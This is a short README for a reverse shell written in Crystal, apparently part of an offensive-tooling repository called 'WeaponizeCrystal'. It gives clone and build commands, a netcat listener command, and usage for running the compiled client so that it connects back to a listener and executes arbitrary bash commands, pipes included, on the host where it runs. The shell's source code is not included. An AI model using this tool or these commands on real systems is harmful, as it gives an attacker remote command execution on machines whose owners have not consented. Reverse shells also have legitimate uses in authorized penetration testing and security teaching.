# reverse_shell

Simple reverse shell using `Sockets`, `Process` and `File`.

## Installation

```sh
git clone https://github.com/js-on.de/WeaponizeCrystal.git
cd WeaponizeCrystal/reverse_shell
shards install
# compile
crystal build --single-module src/reverse_shell.cr
```

## Usage
*./reverse_shell ip port*
```sh
# Listener:
nc -lvnp 4444

# Client:
./reverse_shell <listener ip> 4444
```

You can use any bash commands you want. The shell value of `Process.run` is `true`, so even pipes are working.

Internal bash commands are not yet implemented due to missing importance; except of `cd`.

Type `?, help` to view commands provided by this reverse shell.
